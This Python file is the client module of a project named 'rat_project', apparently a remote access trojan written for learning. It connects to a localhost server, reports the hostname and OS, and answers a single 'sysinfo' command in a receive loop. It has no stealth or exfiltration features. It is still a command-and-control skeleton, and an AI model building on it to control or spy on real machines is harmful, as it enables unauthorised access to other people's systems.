import platform
import socket

from rat_project.client.client_actions import get_system_info
from rat_project.common.protocol import decode_message, encode_message
from rat_project.utils.logger_config import setup_logger

HOST = "127.0.0.1"
PORT = 8888

logger = setup_logger("client")


def build_registration_payload() -> dict[str, str]:
    return {
        "type": "register",
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "release": platform.release(),
    }


def handle_server_command(message: dict[str, str]) -> dict[str, str]:
    command = message.get("command")

    if command == "sysinfo":
        return {
            "type": "command_result",
            "command": "sysinfo",
            "output": get_system_info(),
        }

    return {
        "type": "command_result",
        "command": command or "unknown",
        "output": "Unknown command",
    }


def run_client() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((HOST, PORT))
        logger.info("Connected to server %s:%s", HOST, PORT)

        payload = build_registration_payload()
        client_socket.sendall(encode_message(payload))
        logger.info("Registration sent: %s", payload)

        data = client_socket.recv(4096)
        message = decode_message(data)
        logger.info("Received message: %s", message)

        while True:
            data = client_socket.recv(65536)
            if not data:
                logger.info("Server disconnected")
                break

            server_message = decode_message(data)
            logger.info("Received command: %s", server_message)

            response = handle_server_command(server_message)
            client_socket.sendall(encode_message(response))


if __name__ == "__main__":
    run_client()
